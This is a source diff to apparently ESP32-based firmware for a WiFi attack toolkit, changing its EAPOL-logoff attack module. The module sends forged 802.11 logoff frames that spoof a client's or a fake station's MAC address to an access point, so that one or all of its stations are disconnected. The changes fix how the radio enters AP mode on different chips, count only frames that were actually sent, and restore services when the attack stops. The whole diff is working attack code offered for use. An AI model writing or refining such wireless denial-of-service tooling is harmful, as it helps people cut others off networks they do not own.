@@ -11,6 +11,7 @@
 
 #include "attacks/wifi/eapol_logoff.h"
 #include "managers/wifi_manager.h"
+#include "managers/ap_manager.h"
 #include "managers/status_display_manager.h"
 #include "managers/views/terminal_screen.h"
 #include "core/system_manager.h"
@@ -77,8 +78,9 @@ static void eapol_logoff_task(void *param) {
             memcpy(&frame[10], sta_mac, 6);     // src: station
             memcpy(&frame[16], ap_bssid, 6);    // bssid: ap
             
-            esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
-            eapol_logoff_packets_sent++;
+            if (esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false) == ESP_OK) {
+                eapol_logoff_packets_sent++;
+            }
         } else if (strlen((const char *)selected_ap.ssid) > 0) {
             // target selected ap - send logoff for all its stations
             uint8_t *ap_bssid = selected_ap.bssid;
@@ -94,8 +96,9 @@ static void eapol_logoff_task(void *param) {
                     memcpy(&frame[10], station_ap_list[j].station_mac, 6);    // src: station
                     memcpy(&frame[16], ap_bssid, 6);                          // bssid: ap
                     
-                    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
-                    eapol_logoff_packets_sent++;
+                    if (esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false) == ESP_OK) {
+                        eapol_logoff_packets_sent++;
+                    }
                     sent_any = true;
                     vTaskDelay(pdMS_TO_TICKS(5));
                 }
@@ -119,8 +122,9 @@ static void eapol_logoff_task(void *param) {
                 memcpy(&frame[10], fake_sta, 6);    // src: fake station
                 memcpy(&frame[16], ap_bssid, 6);    // bssid: ap
                 
-                esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
-                eapol_logoff_packets_sent++;
+                if (esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false) == ESP_OK) {
+                    eapol_logoff_packets_sent++;
+                }
             }
         } else {
             // no target selected, signal stop and exit
@@ -161,11 +165,23 @@ void eapol_logoff_start(void) {
     // mode here (as deauth/beacon-spam/channel-switch do) instead of relying on
     // the WiFi manager having booted in APSTA — it now runs STA-only when the
     // SoftAP is disabled in settings, so an ambient AP interface isn't guaranteed.
-    esp_err_t mode_err = esp_wifi_set_mode(WIFI_MODE_AP);
-    if (mode_err != ESP_OK) {
-        glog("EAPOL Logoff: failed to set AP mode: %s\n", esp_err_to_name(mode_err));
-        return;
-    }
+    ap_manager_stop_services();
+    esp_wifi_stop();
+    vTaskDelay(pdMS_TO_TICKS(50));
+
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+    wifi_protocols_t p = {
+        .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR,
+        .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
+    };
+    esp_wifi_set_protocols(WIFI_IF_AP, &p);
+    ESP_ERROR_CHECK(esp_wifi_start());
+#else
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+    ESP_ERROR_CHECK(esp_wifi_start());
+    (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
+#endif
 
     eapol_logoff_running = true;
     eapol_logoff_packets_sent = 0;
@@ -180,6 +196,8 @@ void eapol_logoff_start(void) {
             vTaskDelete(eapol_logoff_task_handle);
             eapol_logoff_task_handle = NULL;
         }
+        esp_wifi_stop();
+        ap_manager_start_services();
 #ifdef CONFIG_WITH_STATUS_DISPLAY
         status_display_show_status("EAPOL start failed");
 #endif
@@ -196,7 +214,11 @@ void eapol_logoff_stop(void) {
     eapol_logoff_running = false;
     
     // Wait for tasks to finish gracefully before force deletion
-    vTaskDelay(pdMS_TO_TICKS(100));
+    int wait_count = 0;
+    while (eapol_logoff_task_handle != NULL && wait_count < 100) {
+        vTaskDelay(pdMS_TO_TICKS(10));
+        wait_count++;
+    }
     
     // Delete attack task if still exists
     if (eapol_logoff_task_handle) {
@@ -204,6 +226,9 @@ void eapol_logoff_stop(void) {
         eapol_logoff_task_handle = NULL;
         vTaskDelete(temp_handle);
     }
+    
+    esp_wifi_stop();
+    ap_manager_start_services();
     
     glog("EAPOL-Logoff stopped. Total: %lu packets\n", (unsigned long)eapol_logoff_packets_sent);
 #ifdef CONFIG_WITH_STATUS_DISPLAY
